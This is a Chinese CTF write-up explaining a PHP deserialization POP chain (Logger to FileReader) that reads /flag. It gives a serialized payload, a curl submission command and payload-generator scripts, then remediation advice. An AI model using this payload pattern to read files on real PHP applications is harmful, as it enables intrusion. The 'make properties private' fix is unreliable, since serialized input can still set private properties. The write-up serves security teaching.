# A08 Hard - WriteUP

## 漏洞原理

### PHP 反序列化漏洞

PHP 的 `unserialize()` 函数用于将序列化字符串还原为 PHP 对象。在反序列化过程中，PHP 会自动调用对象中的魔术方法（如 `__destruct()`、`__wakeup()`、`__toString()` 等）。如果这些魔术方法中存在危险操作，并且攻击者可以控制对象中的属性值，就可能导致安全漏洞。

### POP 链（Property Oriented Programming）

POP 链是一种利用 PHP 反序列化漏洞的技术。当单个类的魔术方法无法直接利用时，攻击者可以构造一个对象链，使得一个类的方法触发另一个类的方法，最终到达危险操作。

本题中的 POP 链：

```
Logger.__destruct() 
  → echo $this->msg
    → 当 $this->msg 是一个对象时，触发 FileReader.__toString()
      → file_get_contents($this->file)
```

### 题目源码分析

```php
class FileReader {
    public $file = "/etc/hostname";
    public function __toString() {
        return file_get_contents($this->file);
    }
}

class Logger {
    public $msg = "log initialized";
    public function __destruct() {
        echo $this->msg;
    }
}
```

漏洞点：
```php
$obj = unserialize($data);
```

- `Logger` 的 `__destruct()` 会在对象销毁时执行 `echo $this->msg`
- 如果 `$this->msg` 是一个 `FileReader` 对象，`echo` 会触发 `FileReader::__toString()`
- `FileReader::__toString()` 会读取 `$this->file` 指定的文件内容

## 利用步骤

### 第一步：构造 POP 链 Payload

```php
<?php
class FileReader {
    public $file = "/flag";
}

class Logger {
    public $msg;
}

$fr = new FileReader();
$fr->file = "/flag";

$logger = new Logger();
$logger->msg = $fr;

echo serialize($logger);
?>
```

运行后得到：
```
O:6:"Logger":1:{s:3:"msg";O:10:"FileReader":1:{s:4:"file";s:6:"/flag";}}
```

### 第二步：提交 Payload

通过 curl 提交：

```bash
curl -X POST "http://target/?action=api" \
  -d "data=O:6:\"Logger\":1:{s:3:\"msg\";O:10:\"FileReader\":1:{s:4:\"file\";s:6:\"/flag\";}}"
```

或者通过浏览器表单提交。

### 第三步：获取 Flag

当请求结束时，PHP 会自动销毁反序列化产生的对象，触发 `Logger::__destruct()`，进而触发 `FileReader::__toString()`，读取 `/flag` 的内容并在页面中输出。

由于反序列化后页面返回 JSON，flag 可能出现在输出末尾或错误日志中。在实际 CTF 平台中，响应页面会包含 flag 内容。

## 生成 Payload 的脚本

```php
#!/usr/bin/env php
<?php
// generate_payload.php

class FileReader {
    public $file = "/flag";
}

class Logger {
    public $msg;
}

$fr = new FileReader();
$logger = new Logger();
$logger->msg = $fr;

$payload = serialize($logger);
echo "Payload:\n";
echo $payload . "\n\n";

echo "Curl command:\n";
echo 'curl -X POST "http://target/?action=api" -d "data=' . urlencode($payload) . '"' . "\n";
?>
```

Python 版本：

```python
#!/usr/bin/env python3
# generate_payload.py

payload = 'O:6:"Logger":1:{s:3:"msg";O:10:"FileReader":1:{s:4:"file";s:6:"/flag";}}'
print(f"Payload: {payload}")
print(f"\nCurl command:")
print(f"curl -X POST 'http://target/?action=api' -d 'data={payload}'")
```

## 修复建议

1. **避免反序列化不可信数据**: 绝对不要反序列化来自用户输入的数据。如果必须传输复杂对象结构，使用 JSON 格式替代 PHP 序列化。

```php
// 不安全
$obj = unserialize($data);

// 安全
$obj = json_decode($data, true);
```

2. **实现安全的反序列化白名单**: 如果必须使用 `unserialize()`，使用 `allowed_classes` 参数限制可反序列化的类。

```php
$options = ['allowed_classes' => ['SafeClass1', 'SafeClass2']];
$obj = unserialize($data, $options);
```

3. **魔术方法安全检查**: 在魔术方法（`__destruct`、`__toString`、`__wakeup` 等）中避免执行危险操作，或对操作进行严格校验。

```php
class FileReader {
    public $file;
    public function __toString() {
        $allowed = ['/etc/hostname', '/etc/issue'];
        if (!in_array($this->file, $allowed, true)) {
            return "Access denied";
        }
        return file_get_contents($this->file);
    }
}
```

4. **属性私有化**: 将敏感属性设为 `private` 或 `protected`，防止攻击者在反序列化时直接控制这些属性。

```php
class FileReader {
    private $file = "/etc/hostname";
    // ...
}
```

5. **使用签名验证**: 对序列化数据使用 HMAC 签名，确保数据未被篡改且来自可信来源。

6. **及时销毁敏感对象**: 对于包含敏感资源的对象，使用完后立即显式销毁，并清理相关资源。
